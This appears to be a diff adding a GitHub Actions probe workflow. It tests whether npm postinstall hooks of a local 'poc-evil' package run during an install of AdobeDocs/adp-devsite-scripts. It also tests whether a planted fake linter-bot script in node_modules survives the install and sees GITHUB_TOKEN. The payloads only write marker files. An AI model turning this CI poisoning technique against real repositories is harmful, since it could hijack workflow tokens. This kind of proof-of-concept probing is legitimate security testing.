@@ -1,0 +1,83 @@
+name: probe-ws
+on:
+  workflow_dispatch:
+
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - name: env
+        run: |
+          echo "NPM=$(npm -v) NODE=$(node -v) WS=$GITHUB_WORKSPACE"
+          npm config list 2>&1 | sed -n '1,40p'
+
+      - name: case-tmp-control
+        run: |
+          set +e
+          d=/tmp/w1; rm -rf "$d"; mkdir -p "$d/poc-evil"
+          printf '{"name":"r","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil"}}\n' > "$d/package.json"
+          printf '{"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}\n' > "$d/poc-evil/package.json"
+          printf "require('fs').writeFileSync('%s/RAN.txt','ran')\nconsole.log('HOOK-RAN-%s')\n" "$d" "$d" > "$d/poc-evil/hook.js"
+          ( cd "$d" && npm install --no-save github:AdobeDocs/adp-devsite-scripts >"$d/npm.log" 2>&1; echo "exit=$?" >> "$d/npm.log" )
+          if [ -f "$d/RAN.txt" ]; then echo "CASE tmp-control => RAN"; else echo "CASE tmp-control => NOT-RAN"; fi
+          tail -6 "$d/npm.log"
+
+      - name: case-workspace-subdir
+        run: |
+          set +e
+          d="$GITHUB_WORKSPACE/w2"; rm -rf "$d"; mkdir -p "$d/poc-evil"
+          printf '{"name":"r","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil"}}\n' > "$d/package.json"
+          printf '{"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}\n' > "$d/poc-evil/package.json"
+          printf "require('fs').writeFileSync('%s/RAN.txt','ran')\nconsole.log('HOOK-RAN-%s')\n" "$d" "$d" > "$d/poc-evil/hook.js"
+          ( cd "$d" && npm install --no-save github:AdobeDocs/adp-devsite-scripts >"$d/npm.log" 2>&1; echo "exit=$?" >> "$d/npm.log" )
+          if [ -f "$d/RAN.txt" ]; then echo "CASE ws-subdir => RAN"; else echo "CASE ws-subdir => NOT-RAN"; fi
+          tail -6 "$d/npm.log"
+
+      - name: case-workspace-root
+        run: |
+          set +e
+          d="$GITHUB_WORKSPACE"; mkdir -p "$d/poc-evil"
+          printf '{"name":"r","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil"}}\n' > "$d/package.json"
+          printf '{"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}\n' > "$d/poc-evil/package.json"
+          printf "require('fs').writeFileSync('%s/RAN.txt','ran')\nconsole.log('HOOK-RAN-%s')\n" "$d" "$d" > "$d/poc-evil/hook.js"
+          ( cd "$d" && npm install --no-save github:AdobeDocs/adp-devsite-scripts >"$d/npm.log" 2>&1; echo "exit=$?" >> "$d/npm.log" )
+          if [ -f "$d/RAN.txt" ]; then echo "CASE ws-root => RAN"; else echo "CASE ws-root => NOT-RAN"; fi
+          tail -6 "$d/npm.log"
+
+      - name: case-allowscripts-json
+        run: |
+          set +e
+          for key in '{"poc-evil":true}' '{"poc-evil":["postinstall"]}' '{"poc-evil":"postinstall"}'; do
+            d=/tmp/w4; rm -rf "$d"; mkdir -p "$d/poc-evil"
+            printf '{"name":"r","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil"},"allowScripts":%s}\n' "$key" > "$d/package.json"
+            printf '{"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}\n' > "$d/poc-evil/package.json"
+            printf "require('fs').writeFileSync('%s/RAN.txt','ran')\n" "$d" > "$d/poc-evil/hook.js"
+            ( cd "$d" && npm install --no-save github:AdobeDocs/adp-devsite-scripts >"$d/npm.log" 2>&1 )
+            if [ -f "$d/RAN.txt" ]; then echo "CASE allowScripts=$key => RAN"; else echo "CASE allowScripts=$key => NOT-RAN"; fi
+            grep -i "install-scripts" "$d/npm.log" | head -3
+          done
+
+      - name: case-npmrc
+        run: |
+          set +e
+          for cfg in "allow-scripts=poc-evil" "allow-scripts=true" "allow-scripts=all"; do
+            d=/tmp/w5; rm -rf "$d"; mkdir -p "$d/poc-evil"
+            printf '{"name":"r","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil"}}\n' > "$d/package.json"
+            printf '{"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}\n' > "$d/poc-evil/package.json"
+            printf "require('fs').writeFileSync('%s/RAN.txt','ran')\n" "$d" > "$d/poc-evil/hook.js"
+            printf '%s\n' "$cfg" > "$d/.npmrc"
+            ( cd "$d" && npm install --no-save github:AdobeDocs/adp-devsite-scripts >"$d/npm.log" 2>&1 )
+            if [ -f "$d/RAN.txt" ]; then echo "CASE npmrc[$cfg] => RAN"; else echo "CASE npmrc[$cfg] => NOT-RAN"; fi
+            grep -i "install-scripts" "$d/npm.log" | head -3
+          done
+
+      - name: case-fake-node-modules
+        run: |
+          set +e
+          d=/tmp/w6; rm -rf "$d"; mkdir -p "$d/node_modules/adp-devsite-scripts/linter-bot"
+          printf '{"name":"r","version":"1.0.0","private":true}\n' > "$d/package.json"
+          printf '{"name":"adp-devsite-scripts","version":"99.0.0"}\n' > "$d/node_modules/adp-devsite-scripts/package.json"
+          printf "console.log('FAKE-SCRIPT-RAN token=' + (process.env.GITHUB_TOKEN ? 'present' : 'missing'))\n" > "$d/node_modules/adp-devsite-scripts/linter-bot/postLinterReport.js"
+          ( cd "$d" && npm install --no-save github:AdobeDocs/adp-devsite-scripts >"$d/npm.log" 2>&1 )
+          echo "--- post install content:"; head -2 "$d/node_modules/adp-devsite-scripts/linter-bot/postLinterReport.js"
+          node "$d/node_modules/adp-devsite-scripts/linter-bot/postLinterReport.js" 2>&1 | head -3
